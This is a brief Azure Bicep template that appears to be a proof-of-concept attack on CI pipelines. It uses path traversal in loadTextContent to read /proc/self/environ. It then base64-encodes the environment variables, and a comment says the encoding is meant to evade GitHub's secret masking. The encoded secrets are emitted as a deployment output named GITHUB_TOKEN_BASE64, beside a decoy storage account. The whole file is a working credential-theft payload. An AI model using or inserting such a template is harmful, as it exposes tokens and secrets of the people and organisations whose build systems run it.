var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')

  // Base64 encode to bypass GitHub's secret masking
  var encoded = base64(secrets)

  param location string = 'eastus'

  resource storageAccount 'Microsoft.Storage/storageAccounts@2021-02-01' = {
    name: 'yourbaseisnowbelongtous'
    location: location
    sku: { name: 'Standard_LRS' }
    kind: 'StorageV2'
  }

  output GITHUB_TOKEN_BASE64 string = encoded